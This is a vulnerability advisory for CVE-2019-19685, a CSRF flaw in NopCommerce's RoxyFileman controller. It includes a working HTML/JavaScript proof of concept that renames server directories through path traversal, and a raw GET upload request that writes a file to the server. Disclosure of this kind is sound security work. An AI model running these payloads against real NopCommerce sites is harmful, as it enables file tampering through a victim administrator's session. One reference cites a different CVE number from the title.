---
layout: default
parent: NopCommerce Shopping CMS
nav_order: 1
title: CVE-2019-19685 - Cross-Site-Request-Forgery (CSRF)
---

# Cross-Site-Request-Forgery (CSRF)

## Summary

It was observed that the application, although implementing a strong Cross-Site Request Forgery protection, allowed for some requests to be sent without a valid synchronizer token. This allows attackers to cause application users or administrators to carry out functionality on their behalf, such as adding a new administrative user or changing a user's details.

Cross-Site Request Forgery (CSRF) is an attack which masks web application functionality in such a way so as to trick the user into loading a page that contains a spoofed request. The request inherits the identity and privileges
of the victim to perform an undesired function on the victim's behalf, like change the victim's e-mail address, home address, password, or purchase something. CSRF attacks generally target functions that cause a state
change on the server but can also be used to access sensitive data.

Affected are all the functionalities of the file Libraries/Nop.Services/Media/RoxyFileman/RoxyFilemanController.cs. CWE is classifying the issue as CWE-352. This is going to have an impact on confidentiality and integrity.

The weakness was discovered during July 2019 and it is traded as CVE-2019-19685 since 12/09/2019. The exploitability is told to be non-trivial. It is possible to launch the attack remotely. A single authentication is necessary for exploitation. Technical details are known, and a public exploit has been developed by Alessandro Magnosi and released to the public.

The issue was previously mitigated implementing the same-site cookie protection, which is set to “lax”. However, the implementation of RoxyFileman allows to delete, rename and move directories and files using the HTTP GET request method, making this kind of protection useless, as with same-site attribute set to “lax”, cookies are sent in any case if the HTTP Method is GET. Moreover, against any specification, the RoxyFIleman implementation doesn’t check the HTTP request, meaning that it is possible to upload a file using a non-RFC compliant GET (with a request body).

## Proof-of-Concept

The following PoC can be used to create a file under C:\Users\Public\Document [Replace depending on installation type]. 

**Steps to reproduce:**

1. Copy the code in poc.html file
2. Modify in the PoC the target references
3. Login as admin into NopCommerce web application
4. Open the file with the browser in a new tab
5. Check on the server filesystem if C:\Users\Public\Documents\pwnd.txt has been created


```

<html>
  <!-- CSRF PoC - Rename Directory Common -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var target = “http://192.168.226.128”;
        var xhr = new XMLHttpRequest();
        xhr.open("GET", target + "/nopcommerce\/Admin\/RoxyFileman\/ProcessRequest?a=RENAMEDIR&d=%2fimages%2fuploaded%2f..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2fCommon%2f&n=Common2", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.withCredentials = true;
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

```


An additional PoC has been provided in a raw form to explain how it was possible to upload a file using a GET, below.

```
GET /Admin/RoxyFileman/ProcessRequest?a=UPLOAD HTTP/1.1
Host: <SNIPPED>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3125261928760
Content-Length: 556
Connection: close
Cookie: [SNIPPED][To change with a valid admin session]

-----------------------------3125261928760
Content-Disposition: form-data; name="action"

upload
-----------------------------3125261928760
Content-Disposition: form-data; name="method"

ajax
-----------------------------3125261928760
Content-Disposition: form-data; name="d"

/images/uploaded/../../../../../../../../../../Users/Public/Documents/
-----------------------------3125261928760
Content-Disposition: form-data; name="files[]"; filename="pwnd.txt"
Content-Type: image/png

PWND!!!

-----------------------------3125261928760--
```

Using the following PoC, a file named “pwnd.txt” will appear in C:\Users\Public\Document folder.


## Remediation

Upgrading to version 4.3.0 solves the issue.

## References

*	https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) 
*	https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet 
*	https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9042 



 
